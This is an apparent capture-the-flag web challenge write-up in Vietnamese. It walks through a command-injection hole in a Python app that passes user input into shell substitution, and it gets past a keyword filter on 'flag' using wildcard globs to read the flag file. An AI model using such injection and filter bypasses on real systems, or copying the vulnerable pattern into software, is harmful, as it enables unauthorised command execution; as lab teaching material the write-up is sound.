# Write Up

Đây là 1 bài web khá đơn giản cho anh em.

Ban đầu chúng ta có thể thử 1 số lệnh như là

```bash
ls -l
```

Chúng ta sẽ nhận được cái file/folder.

```txt
total 24 
-rwxr-xr-x 1 root root 884 Apr 21 2023 app.py 
drwxr-xr-x 3 root root 4096 Apr 21 2023 dream 
-rw-r--r-- 1 root root 34 Apr 21 2023 hint.txt 
-rw-r--r-- 1 root root 5 Apr 21 2023 requirements.txt 
drwxr-xr-x 5 root root 4096 Apr 21 2023 static 
drwxr-xr-x 2 root root 4096 Apr 21 2023 templates
```

Tiếp đến chúng ta có thể đọc thử file `hint.txt`

```bash
cat hint.txt
```

Ta sẽ nhận được:

```txt
Where is Flag? ./dream/hack/hello
```

Theo gợi ý trên chúng ta sẽ thử liệt kê các file/folder có trong `./dream/hack/hello`

```bash
ls -l ./dream/hack/hello
```

Và chúng ta nhận được 1 file là `flag.txt`

```txt
total 4 -rw-r--r-- 1 root root 68 Apr 21 2023 flag.txt
```

OK bây giờ mọi việc trở nên đơn giản là đọc file `flag.txt`, nhưng trong `app.py` lại có đoạn kiểm tra như sau:

```python
cmd = f'echo $({user_input})'
if 'flag' in cmd:
    return render_template('index.html', result='No!')
```

Vậy chúng ta không thể nhập thẳng chữ `flag` vào được do nó sẽ trả về `No!` ngay.
Chúng ta sẽ đi 1 đường vòng là sử dụng ký tự tương đương như `*` hay `?`

```bash
cat ./dream/hack/hello/fla*.txt 
# Hoặc
cat ./dream/hack/hello/fla?.txt
```

Flag: DH{671ce26c70829e716fae26c7c71a33823feb479f2562891f64605bf68f60ae54}